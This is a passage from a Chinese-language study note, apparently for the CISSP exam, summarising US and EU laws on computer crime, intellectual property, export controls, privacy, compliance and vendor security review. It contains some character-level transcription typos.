刑法和民法制定的规则和措施不可能在任何可能的情况下都被遵守。因此，执行机构有制定行政法的回旋余地，从而以政策、规章和制度的方式管理机构的日常运作。虽然行政法不需要立法机构的法案来获得法律的效力，但是必须遵守所有己存在的民法和刑法。</p><h3 id="4-2-法律"><a href="#4-2-法律" class="headerlink" title="4.2 法律"></a>4.2 法律</h3><h4 id="4-2-1-计算机犯罪"><a href="#4-2-1-计算机犯罪" class="headerlink" title="4.2.1 计算机犯罪"></a>4.2.1 计算机犯罪</h4><h5 id="1-计算机诈骗和滥用法案"><a href="#1-计算机诈骗和滥用法案" class="headerlink" title="1. 计算机诈骗和滥用法案"></a>1. 计算机诈骗和滥用法案</h5><p>　　美国国会在1984年首先制定了计算机欺诈和滥用法案(CFAA)，并且通过一些修正后，直到今天仍然在执行。这条法律经过精心编写，专门用于跨越州边界的计算机犯罪，避免违反州的权力和践踏宪法。法案的主要条款主要针对下列这些罪行：</p><ul><li>没有经过授权或超出了权限范围而访问联邦系统中的机密信息或财务信息。</li><li>没有经过授权而访问只能由联邦政府使用的计算机。</li><li>使用联邦计算机进行欺诈活动(除了欺诈的唯一目标是要使用计算机本身) 。</li><li>对联邦计算机系统造成恶意损失超过1000美元的行为。</li><li>修改计算机中的医疗记录，从而影响或可能影响个人的检查、诊断、治疗或医疗看护。</li><li>非法买卖计算机密码，如果非法买卖行为影响了州间的贸易或涉及联邦的计算机系统。</li></ul><p>　　计算机欺诈和滥用法案在1986年经过了修正，法案的作用范围也有所改变。除了处理敏感信息的联邦计算机之外，法案中还包括了所有的涉及联邦利益的计算机。增加了如下范围：</p><ul><li>由美国政府专门使用的所有计算机。由金融机构专门使用的所有计算机。</li><li>当犯罪活动妨碍了政府或机构使用系统的能力时，由政府或金融机构专门使用的计算机。</li><li>不处在同一个州的被用于犯罪活动的所有计算机的组合。</li></ul><h5 id="2-CFAA修正案-1994年"><a href="#2-CFAA修正案-1994年" class="headerlink" title="2. CFAA修正案(1994年)"></a>2. CFAA修正案(1994年)</h5><ul><li>宣布那些可能造成计算机系统损害的、生成任何类型恶意代码的行为是不合法的。</li><li>修改了CFAA，包含了所有被用于州间贸易的计算机，而不只是包含用于联邦利益的计算机系统。</li><li>允许关押罪犯，不管他们是否造成了实际的损坏。</li><li>为计算机犯罪的受害者提供了提起民事诉讼的法律权力，对受到的损失可以申请获得减轻和补偿。</li></ul><h5 id="3-计算机安全法案-1987年"><a href="#3-计算机安全法案-1987年" class="headerlink" title="3. 计算机安全法案(1987年)"></a>3. 计算机安全法案(1987年)</h5><p>　　美国国会成员对他们看到的情况很不满意，进而制定了计算机安全法案(CSA，1987年)，为所有的联邦机构设置了安全要求基准。在引入CSA时，美国国会详细规定了法案的4 个主要目的，如下所示：</p><ul><li>授予美国国家标准技术研究所(NIST)开发联邦计算机系统标准和准则的职责，包括负责为联邦计算机系统开发标准和准则。在适当时使用美国国家安全局(NSA)的技术性建议和援助(包括工作产品)。</li><li>颁布这些标准和准则。</li><li>要求包含敏感信息的联邦计算机系统的所有操作人员制定安全计划。</li><li>要求包含敏感信息的联邦计算机系统所涉及的所有管理、使用和操作人员强制性参加定期培训。</li></ul><p>　　这条法案中宣布的许多要求经过很多年形成了美国联邦计算机安全策略的基础，而且还将计算机安全的责任分摊给两个联邦机构。原来美国国家安全局(NSA)对所有的计算机安全问题都有权限，现在只保留了对机密系统的权限。美国国家标准技术研究所(NIST)获得了负责保护其他所有联邦政府系统的权利。</p><h5 id="4-美国联邦判决指导方针"><a href="#4-美国联邦判决指导方针" class="headerlink" title="4. 美国联邦判决指导方针"></a>4. 美国联邦判决指导方针</h5><p>　　1991年发布的美国联邦判决指导方针提供了处罚指导方针，从而帮助联邦法官解释说明计算机犯罪的相关法律。如下所示，这些指导方针的三个条款对信息安全团体产生了持久的影响：</p><ul><li>指导方针使审慎者规则成为书面形式，这种规则要求高级行政长官个人负责确保平常的适度关注，审慎的个人会经历相同的情况。这条在财政责任领域中开发的规则现在也被应用于信息安全领域。</li><li>通过证明使用适度关注来履行自己的信息安全责任，指导方针允许组织和行政长官遭受最小的违法处罚。</li><li>指导方针概述了三个为疏忽提供证据的责任。首先，被控疏忽的人员必须具有法律上认可的责任。其次，被控人员必须未遵守公认的标准。最后，疏忽行为和随后，的受损之间必须存在因果关系。</li></ul><h5 id="5-美国国家信息基础设施保护法案-1996年"><a href="#5-美国国家信息基础设施保护法案-1996年" class="headerlink" title="5. 美国国家信息基础设施保护法案(1996年)"></a>5. 美国国家信息基础设施保护法案(1996年)</h5><p>　　1996年，美国国会还通过了对计算机诈骗和滥用法案的一系列修正案，从而进一步扩展了其提供的保护范围，其中包括了下面这些新覆盖的领域：</p><ul><li>放宽了法案的范围，除了用于州间贸易的计算机系统，还包括用于国际贸易的计算机系统。</li><li>扩展了对国家基础设施(除了计算系统外还有铁路、燃气管道、电网和通信线路)的类似保护。</li><li>对于故意的或不计后果的造成国家基础设施重要部分损坏的行为，作为重罪处理。</li></ul><h5 id="6-文书精简法案-1995年"><a href="#6-文书精简法案-1995年" class="headerlink" title="6. 文书精简法案(1995年)"></a>6. 文书精简法案(1995年)</h5><p>　　文书精简法案(1995年)要求机构在请求大多数类型的公共信息之前，必须获得美国行政管理和预算局(Office ofManagement and Budget，OMB)的批准。信息收集包括表格、会谈、记录保存要求以及其他各种行为。</p><h5 id="7-政府信息安全改革法案-2000年"><a href="#7-政府信息安全改革法案-2000年" class="headerlink" title="7. 政府信息安全改革法案(2000年)"></a>7. 政府信息安全改革法案(2000年)</h5><p>　　2000年的美国政府信息安全改革法案(GISA)修正了美国法典，从而实施了额外的信息安全策略和措施。在该法案的文本中，美国国会为建立GISRA设置了下列5个基本目标：</p><ul><li>提供内容全面的体制，从而建立和确保控制那些支持联邦工作和资产的信息资源的有效性。</li><li>认识到联邦计算环境高度网络化的特点，其中包括联邦政府协同工作能力的需要以及改善的安全管理措施的实现，从而保证协同工作的能力不会受到负面影响。</li><li>提供有效的政府范围内的管理以及监督与安全风险相关的信息，包括贯穿所有市民、国家安全和执法社区的信息安全工作。</li><li>为保护联邦信息和信息系统安全所需的最小控制措施提供开发和维护。</li><li>为联邦机构信息安全程序的监督措施的改进提供机制。</li></ul><p>GISRA还创建了一种新的计算机系统类别。关键任务系统满足下面的标准之一：</p><ul><li>被其他法律条款定义为国家安全系统。</li><li>由为机密信息而建立的措施保护。</li><li>对所处理的信息发生丢失、误用、泄露或未经授权的访问，或者对所处理的信息的任何修改都会对机构的任务产生不良影响。</li></ul><h5 id="8-美国联邦信息安全管理法案"><a href="#8-美国联邦信息安全管理法案" class="headerlink" title="8. 美国联邦信息安全管理法案"></a>8. 美国联邦信息安全管理法案</h5><p>　　在2002年通过的美国联邦信息安全管理法案(Federal Information Security Management Act，FISMA)要求联邦机构实施一个信息安全项目，这个项目要覆盖机构部门的运营。FISMA 同样也要求政府部门，包括承包商在内的活动在安全管理项目内。美国国家标准技术研究所(NIST)负责开发FISMA实施指南，概括了下面的关于一个有效信息安全项目的要素：</p><ul><li>定期评估风险，包括可能由未授权的访问、使用、信息披露、破坏、修改，或由信息破坏和支撑着组织运营的系统以及组织的资产导致的伤害，将它们降低到最小。</li><li>基于风险评估的策略和程序，在成本效益原则下把信息安全风险降低到一个可接受的级别，以及确保信息安全贯穿于组织每个信息系统的整个生命周期中。</li><li>下级计划为网络、设施、信息系统或信息系统群体提供恰当的信息安全。</li><li>通过安全意识培训去告知每个人(包括承包商和其他支撑着组织运营和资产的信息系统用户)，信息安全风险关系到他们的活动和责任，要遵守为了降低这些风险由组织设计的策略和程序。</li><li>定期测试和评估信息安全策略、程序、实践和安全控制的有效性，执行频率取决于风险，但每年至少一次。</li><li>规划、实施、评估和记录补救措施的过程，去解决信息安全策略、程序和组织实践中任何不足的地方。</li><li>制定对信息安全事件检测、报告和响应的流程。</li><li>制定计划和程序来确保支撑着组织运营和资产的信息系统的持续运行。</li></ul><h4 id="4-2-2-知识产权"><a href="#4-2-2-知识产权" class="headerlink" title="4.2.2 知识产权"></a>4.2.2 知识产权</h4><p>　　我们将介绍与4 种主要知识产权类型(版权、商标权、专利权和商业秘密)相关的法律，并且还将讨论这些概念如何与信息安全专家相关联。许多国家以不同的方式保护(或不予以保护)这些权力，但是基本的概念在世界各地大体相同。</p><h5 id="1-版权和数字干禧年版权法案"><a href="#1-版权和数字干禧年版权法案" class="headerlink" title="1. 版权和数字干禧年版权法案"></a>1. 版权和数字干禧年版权法案</h5><p>　　版权法保护”原创作品”的创作者，防止创作者的作品遭到未经授权的复制。目前有下列8种主要的作品类别受到版权保护：</p><ul><li>文学作品</li><li>音乐作品</li><li>戏剧作品</li><li>哑剧和舞蹈作品</li><li>绘画、图形和雕刻作品</li><li>电影和其他音像作品</li><li>声音录音</li><li>建筑作品</li></ul><p>　　软件版权属于文学作品这一类。版权法只保护计算机软件中内在的表达方式，也就是实际的源代码，不保护软件背后的思想或过程。目前有一个正规的过程可以获得版权，将受到保护的作品连同注册费用一起送到美国国会图书馆。然而，注意到下面这一点很重要：正式登记版权不是实施版权的先决条件。实际上，法律规定作品的创作者从作品产生出来起就立即自动享有版权。如果能在法院证明你就是作品的创作者(也可能是发行者)，那么你就会受到版权法的保护。正式注册只是让政府承认他们在具体的日期收到了你的作品。<br>　　版权的所有权总是属于作品的创作者。这个政策的特例是：作品是租用的。员工在日常工作期间生产出的作品被认为是”租用的”。目前的版权法提供了一个相当长的保护时间。有一位或多位创作者的作品，被保护的时间是直到最后一位创作者死后70年。租用的作品和匿名作品被保护的时间是以下两项中时间较短者： 从第一次发表日期起的95年，或从创作日期起的120年。<br>　　在1998年，美国国会认识到迅速变化的数字技术正在延伸至现行的版权法。为了迎接这个挑战，他们制定了引起广泛讨论的数字干禧年版权法案(Digital Millennium Copyright Act，DMCA)。DMCA还被用于使美国的版权法符合世界知识产权组织仰Orld Intellectual Property Organization，WIPO)条约中的两个条款。DMCA 的第一个主要条款是阻止那些挫败版权保护机制的企图，这些保护机制由版权所有者用于受保护的作品。这个条款被设计用于保护阻止复制数字介质的机制，如CD和DVD。 DMCA对重复罪行规定了高达100万美元和10年监禁的处罚。非营利性机构(如图书馆和学校)被从这个条款中免除。<br>　　DMCA还限制了当网络服务提供商的线路被罪犯用来违反版权法时应当承担的责任。DMCA认识到，ISP的法律地位与电话公司”普通运营商”的地位类似，并且对于他们的用户的暂时性行为不承担责任。为了符合免除条件的资格，服务提供商的活动必须符合下列各项要求：</p><ul><li>传输必须由提供商之外的某个人发起。</li><li>传输、路由、连接准备或复制必须由自动化的技术过程执行，而不是由服务提供商进行选择。</li><li>服务提供商不能决定数据的接收者。</li><li>任何中间的复制品除了预期的接收者以外，不能让任何人民问，并且保留的时间不能超过合理的需要时间。</li><li>不能修改所传输数据的内容。</li></ul><p>　　DMCA还免除了服务提供商有关系统缓存、搜索引擎和个人用户在网络上存储信息的活动。然而，在这些情况中，服务提供商必须采取迅速的行动，在接到侵权通知之时删除受版权保护的内容。<br>　　美国国会在DMCA中还包括了这样的条款，允许备份计算机软件和维护、测试或需要复制软件的日常活动。这些条款只应用于经过许可的在特定计算机上使用的软件，用法要符合许可证协议，并且这些复制品在不再需要允许的活动时必须被立刻删除。<br>　　最后，DMCA清楚地说明了版权法原则在新兴的Web广播领域中的应用。所谓Web广播，即通过互联网以广播形式，将音频或视频内容传送给接收者。这种技术通常被称为流式音频或流式视频。DMCA声明，这些使用被认为是”合法的非预定传输”。</p><h5 id="2-商标"><a href="#2-商标" class="headerlink" title="2. 商标"></a>2. 商标</h5><p>　　版权法被用来保护创造性的作品，对于商标也有保护。商标是单词、口号和标志语，被用于标识某家公司及其产品或服务。保护商标的主要目的是在保护个人和组织的知识产权时避免市场发生混乱。与版权的保护一样，为了获得法律的保护，商标不需要正式注册。<br>　　商标注册的一个主要好处是： 可以注册一个想要使用的商标，但不必是己经使用的商标。这种类型的应用被称为”使用意向(intent to use)”，并且从提供文档的申请之日起保护商标权(假定在特定期限内将商标真正投入商用)。如果选择不向PTO注册商标，那么保护从第一次使用商标时开始。在美国，接受商标应用主要有下列两个要求：</p><ul><li>该商标不能与其他商标类似，以免造成混淆。这需要在律师尽职搜索期间予以确定。在该商标的开放接受反对意见期间，其他公司可以对应用的商标提出质疑。</li><li>该商标不应该对所提供的产品和服务加以描述。例如，” Mike’s Software Company” 就不是一个好的商标候选名称，因为它描述了该公司生产的产品。如果USPTO 认为该商标具有描述性，就可能拒绝它的应用。</li></ul><p>　　在美国，商标准许的初始期是10年，年限到了可以再连续不受限制地使用10年。</p><h5 id="3-专利权"><a href="#3-专利权" class="headerlink" title="3. 专利权"></a>3. 专利权</h5><p>　　专利权是保护发明者的知识产权。他们提供20 年的保护，在这期间发明者具有独家使用发明的权力(无论是直接使用还是通过许可协议) 。在专利专用期结束时，该发明在公共领域允许任何人使用。<br>专利权有下列三个主要的要求：</p><ul><li>该发明必须是新的。只有在发明是原始创意时，才能申请专利。</li><li>该发明必须是有用的。它必须能够实际工作并完成某种类型的任务。</li><li>该发明不能是显而易见的。例如，你不能为你的主意(即使用喝水的杯子收集一杯雨水)而获得专利权。然而，你可以设计一个特殊的杯子，能优化收集到的雨水，并且将蒸发量减到最少，这个解决方案就可以获得专利。</li></ul><h5 id="4-商业秘密"><a href="#4-商业秘密" class="headerlink" title="4. 商业秘密"></a>4. 商业秘密</h5><p>　　很多公司都有知识产权，这对于他们的业务绝对关键，并且如果泄露给竞争对手或公开，都会会导致相当大的损害，这也就是商业秘密。前面讨论的版权和专利这两种知识产权工具可能被用于保护这种信息类型，但是却具有下列两个主要缺点：</p><ul><li>提出版权或专利应用申请时，要求公开地透露你的工作或发明的细节。这自动去除了产权的”秘密”特性，并且可能由于去除了产品的神秘或者允许不择手段的竞争对手违反国际知识产权法拷贝你的产权而对公司造成伤害。</li><li>版权和专利都提供有限时间的保护。一旦合法保护过期，那么其他公司就可以随意使用你的工作成果(并且他们拥有在申请过程中公开透露的所有细节)。</li></ul><p>　　官方关于商业秘密的处理过程实际上没有那么多，就它们的本质而言，不必向任何人登记，而是自己保持秘密。为了保持秘密，必须对企业实施适当的控制，确保只有经授权的需要了解这些秘密的人才可以访问这些秘密。还必须确保任何具有这类访问能力的人遵守不泄漏协议(NonDisclosureAgr民ment，NDA)以防止与他人共享，并且对违背协议的行为进行处罚。</p><h5 id="5-许可证"><a href="#5-许可证" class="headerlink" title="5. 许可证"></a>5. 许可证</h5><p>　　安全专家还应当熟悉软件许可证颁发协议的相关法律问题。许可证具有下列4种类型：</p><ul><li>合同许可证协议在软件商和用户之间采用书面的合同概述双方的责任。这些协议常见于高价的和/或特别专用的软件包。</li><li>收缩性薄膜包装的许可证协议是写在软件包装外面的协议。由于常常规定撕开封装软件包的收缩薄膜包装就承认了合同条款，因而得名。</li><li>单击包装许可证协议比收缩性薄膜包装协议更普遍。在这种协议类型中，合同条款或者写在软件包装盒外，或者包括在软件文档中。在安装过程中，你被要求单击一个按钮，表示己经阅读了协议条款并且同意遵守这些条款。这为协议的认同过程增添了积极的认可，确保使用者在安装之前知道协议的存在。</li><li>云服务许可协议让单击协议走向了极端。大部分云服务不需要任何形式的书面协议，而是在屏幕上简单闪现法律条款供检阅。在一些情况下，它们也许简单地为用户提供一个到法律条款的链接，以及一个确认己经阅读并同意条款的确认框。对于兴奋地访问一个新服务的大部分用户，他们不阅读协议就简单单击通过，这可能无意中使他们的整个组织负有法律责任的条款和条件。</li></ul><h4 id="4-2-3-进口-出口"><a href="#4-2-3-进口-出口" class="headerlink" title="4.2.3 进口/出口"></a>4.2.3 进口/出口</h4><p>　　美国联邦政府认识到，驱动互联网和电子商务发展的、非常类似的计算机和加密技术，还可能成为军用的强大工具。因此，在冷战期间，美国政府出台了一套复杂的规定，以便控制向其他国家出口敏感的硬件和软件产品。规定包括新技术、知识产权和个人身份信息的跨境数据流管理。直到最近，除了一些选择的盟国之外，向美国以外国家或地区出口强大能力的计算机还是很难的事情。对于加密软件的出口控制甚至更严，实质上向美国以外国家或地区出口加密技术是不可能的。最近美国联邦策略的一些改变已经放松了这些限制，从而提供更加开放的商业环境。</p><h5 id="1-计算机出口控制"><a href="#1-计算机出口控制" class="headerlink" title="1. 计算机出口控制"></a>1. 计算机出口控制</h5><p>　　当前，美国公司可能将高性能的计算机系统出口到事实上没有受到美国政府事先许可的一些国家。如果某些国家被美国商务部的工业和安全局认为，它们构成核扩散问题、支持恐怖主义或与此相关，那么对这些国家来说这条”规则”就是例外的。</p><h5 id="2-加密产品出口控制"><a href="#2-加密产品出口控制" class="headerlink" title="2. 加密产品出口控制"></a>2. 加密产品出口控制</h5><p>　　美国商务部的工业和安全局对向美国以外的国家出口加密产品建立了又一个规定。在前面的规定中，事实上即使向美国以外的国家出口相对低等级的加密技术也是不可能的。这使得美国的软件制造商与没有这些限制的外国公司相比，具有很大的竞争劣势。在经过软件企业的长期游说之后，美国总统指示美国商务部修订其规定，以促进美国安全软件业的成长。<br>　　现在的规定定义了安全软件的零售种类和大规模市场销售。现在这些规则准许公司提交这些产品，由美国商务部进行复审，但是复审将不会超过30 天，在复审成功地完成后，这些公司就可以自由地出口这些产品。</p><h4 id="4-2-4-隐私"><a href="#4-2-4-隐私" class="headerlink" title="4.2.4 隐私"></a>4.2.4 隐私</h4><p>　　在美国，隐私权己经成为多年来争论的热门问题。争论的主要问题是宪法的权利法案没有明确规定隐私权。然而，很多法院都已经支持这个权力，并且像美国公民自由协会(American Civil LibertiesUnion，ACLU)这样的组织也在积极地追求这个权力。欧洲人同样一直在关注他们的隐私。实际上，像瑞士这样的国家由于其保护财务秘密的能力己为世界所知。</p><h5 id="1-美国隐私法"><a href="#1-美国隐私法" class="headerlink" title="1.美国隐私法"></a>1.美国隐私法</h5><ul><li><strong>第四修正案</strong> 隐私权的基础是美国宪法的第四修正案，内容如下所示：人们保护其人身、房屋、证件和财物不受无理搜查和没收的权利不应当被违反，并且这些违反行为不应得到投权批准，但是那些可能性很大的原因、受到誓词或证词支持的、特别描述的需要搜查的地方和需要被逮捕或扣押的人或物品除外。这个修正案的直接解释防止了美国政府机构在缺乏授权批准和可能性很大的原因的情况下对私有财产进行搜查。一些美国法院己经扩展了其对第四修正案的解释，包括针对窃听和侵犯其他隐私的防护。</li><li><strong>隐私法案(1974年)</strong> 美国的隐私法案(1974年)可能是对美国联邦政府处理公民个人私有信息的方法进行限制的最重大的隐私立法，它严格地限制了美国联邦政府机构在没有事先得到当事人书面同意的情况下向他人或其他机构泄漏隐私信息的能力。这个法案还规定了一些例外，涉及人口普查、执法、国家档案、健康和安全以及法院判决。隐私法案要求政府机构只维护那些对于管理其业务必要的记录，并且在政府的合法职能不再需要时销毁这些记录。它为个人对这些政府维护的记录进行访问并要求修正不正确的记录规定了正式的程序。</li><li><strong>电子通信隐私法案(1986年)</strong> 电子通信隐私法案(Electronic Communication Privacy Act，ECPA)使得对个人电子隐私的侵犯成为犯罪行为。这个法案更新了联邦窃听法案，以便应用于非法的电子(也就是计算机)通信侦昕或者对于以电子形式存储的数据的有意和未授权访问。ECPA禁止侦昕或泄漏电子通信，并且定义了公开电子通信的合法情况。该法案对电子邮件和语音邮件通信的监视提供了防护，并且防止这些服务的提供商对这些内容进行未授权的公开。</li><li><strong>执法通信协助法案(1994年)</strong> 执法通信协助法案(Communication Assistance for Law Enforcement Act，CALEA)是对1986年的电子通信隐私法案的修正。CALEA要求：无论采用怎样的技术，所有通信运营商都需要允许持有适当法院判决的执法人员进行窃听。</li><li><strong>经济和专有信息保护法案(1996年)</strong> 经济和专有信息保护法案将财产的定义扩展为包括经济信息，从而可以将窃取这类信息的行为视作针对行业或公司的间谍行为。这个法案修改了盗窃的法律定义，从而使这种行为不再受到物理约束。</li><li><strong>健康保险流通与责任法案(1996 年)</strong> 1996年，美国国会通过了健康保险流通与责任法案(Health Insurance Portability and Accountability Act，HIPAA) ，这使得管理健康保险和健康保护组织(Health Maintenance Organization，HMO)的法律发生了许多变化。在回PAA 的条款中，隐私和安全法规要求医院、医师、保险公司和其他处理或存储个人医疗隐私信息的组织采取严格的安全措施。HIPAA 还明确地定义了个人在医疗记录方面的权利，并且要求保存医疗记录的组织书面表明这些权利。</li><li><strong>2009关于经济和临床健康的卫生信息技术法案</strong> 在2009年，美国国会通过了”关于经济和临床健康的卫生信息技术法案(Health Infomation Technology for Economic and Clinical Health，HITECH)”来修订HIPAA。这条法律更新了许多HIPAA的隐私和安全需求，并于2013 年通过HIPAA Omnibus Rule实施。被新法规强制变化的其中之一就是在法律对待商业伙伴(Business Associate，BA)的方式上，处理被保护的健康信息(protected Health Information，PHI)的组织机构代表了HIPAA覆盖的实体。覆盖实体和一个BA 之间的任何关系必须被书面合同管理，这个合同被称为业务联合协议。HITECH也引入了新的数据泄露通告需求。在HITECH违约通知规则下，经历了数据泄露的HIPAA覆盖实体必须通知受影响的个人，当泄露影响超过500人时，必须通知卫生和人力服务部的部长和媒体。</li><li><strong>儿童联机隐私保护法案(1998年)</strong> 2000年4月，儿童联机隐私保护法案(CHildren’s Online Privacy Protection Act，COPPA)中的规定成为美国本土的法律。COPPA对关心孩子或有意收集孩子的信息的网站提出了一系列要求：<ul><li>网站必须发送隐私通知，清楚地说明他们所收集信息的类型和用途，包括是否有一些信息会泄漏给第三方。隐私通知还必须包括网站工作者的联系信息。</li><li>必须向父母提供机会，复查任何从他们的孩子那里收集到的信息，并且可以从网站的记录中永久地删除这些信息。</li><li>如果孩子的年龄小于13岁，那么在收集信息前，父母必须对有关孩子信息的收集做出可证实的允许。法律中存在一些例外，准许Web站点只是为了获得父母允许收集最少的信息。</li></ul></li><li><strong>Gramm-Leach-Bliley法案(1999年)</strong> 直到Gramm-Leach-Bliley Act(GLBA)法案于1999年成为法律，在商业机构之间才形成了严格的政府屏障。银行、保险公司和贷款提供商受到对他们所能提供的服务和相互共享的信息的严格限制。GLBA 稍微放松了涉及每个组织所能提供的服务的规定。当美国国会通过了这条法案后，它意识到这扩大了具有深远隐私意义的范围。基于这点考虑，该法案包括了许多限制，对可能在相同公司的子公司之间交换的信息类型进行了限制，并且要求从2001年7月1日开始金融机构对所有用户提供书面的隐私策略。</li><li><strong>美国爱国者法案(2001年)</strong> 美国国会对2001年9月11日发生在纽约市和华盛顿哥伦比亚特区的9.11恐怖袭击做出了直接反应：通过了提供拦截和阻止恐怖行为所需的适当工具来团结和巩固美国(USA PATRIOT)法案。美国爱国者法案大大扩大了执法机构和情报机构跨多个领域的力量，包括对电子通信的监视。美国爱国者法案提出的一个主要改变涉及政府机构获取窃听授权的方法。以前，策略只能一次获取一条线路的授权(在证实这条线路被受到监控的某人使用后)。美国爱国者法案规定准许官方获得对个人的一揽子授权，并且随后根据这项单一授权监视此人的所有通信。另一个主要的改变是政府处理网络服务提供商(ISP)的方式。根据美国爱国者法案中的条款，ISP可以自愿地向政府提供大范围的信息。美国爱国者法案还准许政府通过使用传唤获取用户活动的详细信息(与窃听相反)。最后，美国爱国者法案修正了计算机欺诈和滥用法案(是另一组修正案)，从而对犯罪行为处以更严厉的处罚。美国爱国者法案规定了最长20年的监禁条款，并再一次扩大了CFAA的范围。</li><li><strong>子女教育权利和隐私法案</strong> 子女教育权利和隐私法案(Family Educational Rights and Privacy Act，FERPA)是另一种特殊的隐私法案，它影响所有接受美国联邦政府资助的教育机构(绝大多数学校)。这个法案赋予18岁以上的学生和未成年学生父母的确定的隐私权。具体的FERPA 保护包括下列内容：<ul><li>父母/学生具有检查由教育机构保存的此学生教育记录的权利。</li><li>父母/学生具有要求改正他们认为不正确的记录的权利，具有在记录中包括声明争辩任何没有被改正的内容的权利。</li><li>学校不能不经书面许可而发放学生记录的个人信息，某些特定的情况除外。</li></ul></li><li><strong>身份偷窃和冒用阻止法案(1998年)</strong> 1998年，美国总统签署了身份偷窃和冒用阻止法案，从而使之成为法律。在过去，只有身份偷窃的合法受害人才是受侵害的债权人。这个法案使得身份偷窃成为对被偷窃身份的个人犯罪行为，并且规定了对任何违反此法律的人处以严厉的犯罪处罚(长达15年的监禁条款和250000美元的罚款)。</li></ul><h5 id="2-欧盟隐私法"><a href="#2-欧盟隐私法" class="headerlink" title="2.欧盟隐私法"></a>2.欧盟隐私法</h5><p>　　1995年10月24日，欧盟(European Union，EU)议会通过了描绘隐私措施的概括指令，也就是必须采取措施保护信息系统中处理的个人数据。这个指令在3年后(1998年10月)生效。指令要求所有个人数据的处理都要满足下列标准中的某一条：</p><ul><li>同意</li><li>合同</li><li>法律义务</li><li>数据主体的主要利益</li><li>数据所有者和数据主体之间利益的平衡</li></ul><p>　　如下所示，指令还描述了有关数据被持有和处理的个人的重要权利：</p><ul><li>访问数据的权利</li><li>知道数据源的权利</li><li>改正错误数据的权利</li><li>拒绝在某些情况下处理数据的权利</li><li>这些权利被违反时应当采取的合法行为</li></ul><p>　　甚至欧洲以外的组织，根据跨境数据流的要求，必须考虑这些规则的适用性。为防止欧盟公民的个人信息从欧盟泄露出去，这些发送的数据必须确保是受到保护的。在欧洲从事商业活动的美国公司可以根据欧盟和美国之间的谈判获得保护，该谈判准许美国商务部证明业务遵守规定，并且为他们提供”安全避难所”，以免于受到起诉。为了符合安全避难所规定，在欧洲进行商业活动的美国公司必须满足下列7 项处理个人信息的要求：</p><ul><li><strong>通知</strong> 他们必须通知个人收集了什么信息，以及信息将如何使用。</li><li><strong>选择</strong> 如果信息将被用于其他目的或与第三方共享，那么他们必须准许个人决定退出。对于涉及敏感的信息，必须采取决定参加的策略。</li><li><strong>向前传递</strong> 企业只可能与其他遵守安全避难所原则的企业共享数据。</li><li><strong>访问</strong> 个人必须被授权访问任何包含其个人信息的数据。</li><li><strong>安全</strong> 必须采取适当的机制保护数据，以防止丢失、监用和未授权的公开。</li><li><strong>数据完整性</strong> 企业必须采取措施，确保他们所维护信息的可靠性。</li><li><strong>实施</strong> 企业必须为个人提供争论解决办法，向管理机构提供证明，表明遵守安全避难所规定。</li></ul><h3 id="4-3-合规性"><a href="#4-3-合规性" class="headerlink" title="4.3 合规性"></a>4.3 合规性</h3><p>　　在过去的10年间，信息安全管理的监管环境变得越来越复杂。组织可能会发现自己受到广泛的各种各样的法律约束，以及来自监管机构或合同义务的强制合规。组织在面对和处理许多的交叉和有时相互矛盾的合规需求时，需要仔细计划。许多组织雇佣全职的盯合规人员负责跟踪合规环境，监督控制以确保持续合规，促进合规性审核，并满足该组织的合规性报告责任。<br>　　组织可能会经受合规性审计，要么通过标准内部或外部审计机构，要么通过监管或其代理。例如，组织的财务审计人员也许主导IT 控制审计，这种审计被设计用于确保组织金融系统的信息安全控制满足萨班斯·奥克斯利法案的要求。除了正式的审计，组织必须经常把合规遵从报告发送给内部或外部的股东。例如，组织的董事会(或者，更多是董事会的审计委员会)可能需要定期的合规义务和状况的报告。</p><h3 id="4-4-合同与采购"><a href="#4-4-合同与采购" class="headerlink" title="4.4 合同与采购"></a>4.4 合同与采购</h3><p>　　使用云服务和其他外部供应商来存储、处理和传输敏感信息的用户逐渐增加，这导致一些组织在他们的合同签订和采购过程中，实施安全审查和控制成为一个新的关注点。安全专家应该主导对供应商部署的安全控制措施进行审查，这包括最初的供应商选择和评估流程，以及作为供应商持续管理过程的一部分。供应商管理审查中覆盖的一些问题包括：</p><ul><li>什么类型的敏感信息应该由供应商存储、处理或发送?</li><li>在部署保护组织信息时有什么样的控制措施?</li><li>组织的信息如何与其他客户的信息分开?</li><li>如果加密是一种值得信赖的安全控制措施，那么我们要用什么样的加密算法和密钥长度?密钥管理如何进行?</li><li>供应商执行了什么类型的安全审计? 客户访问这些审计必须做什么?</li><li>供应商是否依赖于任何其他第三方来存储、处理或传输数据? 如何处理扩展到第三方与安全有关的合同条款?</li><li>数据存储、处理和传输发生在什么地方? 如果客户或供应商在国外，会有什么影响?</li><li>供应商的事件响应流程是什么? 什么时候将会通知客户存在潜在安全泄露?</li><li>在确保客户数据的持续完整性和可用性方面有什么条款?</li></ul><h3 id="4-5-考试要点"><a href="#4-5-考试要点" class="headerlink" title="4.5 考试要点"></a>4.5 考试要点</h3><ul><li><strong>了解刑法、民法和行政法之间的差别</strong> 刑法保护社会免遭那些违反我们信奉的基本原则的行为。违反刑法的行为是由美国联邦和州政府进行起诉的。民法提供了个人和组织之间的商业交易体制。违反民法的行为被提交法院并由受到影响的双方进行辩论。行政法是由政府机构使用的，目的是为了有效地执行日常事务。</li><li><strong>能够解释用来保护社会免遭计算机犯罪影响的主要法律的基本条款</strong> 计算机诈骗和滥用法案(修正案)保护政府或州间贸易使用的计算机不被滥用。计算机安全法案概括了政府为了保护自己的系统免遭攻击而必须采取的措施。政府信息安全改革法案进一步发展了美国联邦政府信息安全程序。</li><li><strong>了解版权、商标、专利权和商业秘密之间的差别</strong> 版权保护创作者的原创作品，如书籍、文章、诗和歌曲。商标是名称、口号和徽标，用于杭只公司、产品或服务。专利权为新发明的创作者提供保护。商业秘密法律保护公司的运营机密。</li><li><strong>能够解释数字干禧年版权法案(1998年)的基本条款</strong> 数字千禧年版权法案禁止绕过针对数字介质的复制保护机制，并限制网络服务提供商对于其用户行为的责任。</li><li><strong>了解经济间谍法案(1996年)的基本规定</strong> 经济间谍法案对任何被发现偷盗商业秘密的人进行处罚。在盗窃者知道这些信息将为外国政府获利时，他会被处以严厉的处罚。</li><li><strong>理解不同类型的软件许可证协议</strong> 合同许可证协议是软件商和用户之间采用的书面协议。收缩性薄膜包装协议写在软件包装上，并且在用户打开包装时生效。单击包装协议包括在包装中，但是需要用户在软件安装过程中接受这些条款。</li><li><strong>解释关于软件许可证颁发的统一计算机信息剑主里法案</strong> 统一计算机信息处理法案提供了由美国联邦和州政府强制执行的收缩性薄膜包装和单击包装协议的架构。</li><li><strong>理解一个经历数据破坏的组织的通告要求</strong> 